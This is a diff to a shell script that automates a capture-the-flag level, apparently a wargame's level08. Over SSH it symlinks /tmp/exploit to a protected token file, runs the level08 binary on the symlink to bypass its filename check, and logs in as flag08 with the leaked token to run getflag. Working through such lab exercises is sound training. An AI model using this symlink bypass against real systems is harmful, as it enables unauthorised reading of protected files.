@@ -112,14 +112,16 @@ main() {
     flag08_username="flag08";
     flag08_password="";
 
+    exploit_path="/tmp/exploit";
+
     init_ssh_socket "$level08_socket_path" "$host" "$port" "$level08_username" "$level08_password";
-    ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "ln -sf /home/user/level08/token /tmp/exploit";
-    flag08_password=$(ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "/home/user/level08/level08 /tmp/exploit");
+    ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "ln -sf /home/user/level08/token '$exploit_path'";
+    flag08_password=$(ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "/home/user/level08/level08 '$exploit_path'" | head -n 1 | awk '{print $NF}');
+    ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "rm -f '$exploit_path'";
     close_ssh_socket "$level08_socket_path" "$host" "$port" "$level08_username";
 
     init_ssh_socket "$flag08_socket_path" "$host" "$port" "$flag08_username" "$flag08_password";
-    checkflag_str=$(ssh_exec_via_socket "$flag08_socket_path" "$host" "$port" "$flag08_username" "getflag");
-    checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
+    checkflag=$(ssh_exec_via_socket "$flag08_socket_path" "$host" "$port" "$flag08_username" "getflag" | head -n 1 | awk '{print $NF}');
     close_ssh_socket "$flag08_socket_path" "$host" "$port" "$flag08_username";
 
     flag_outpath="$CURR_DIR_PATH/../flag";
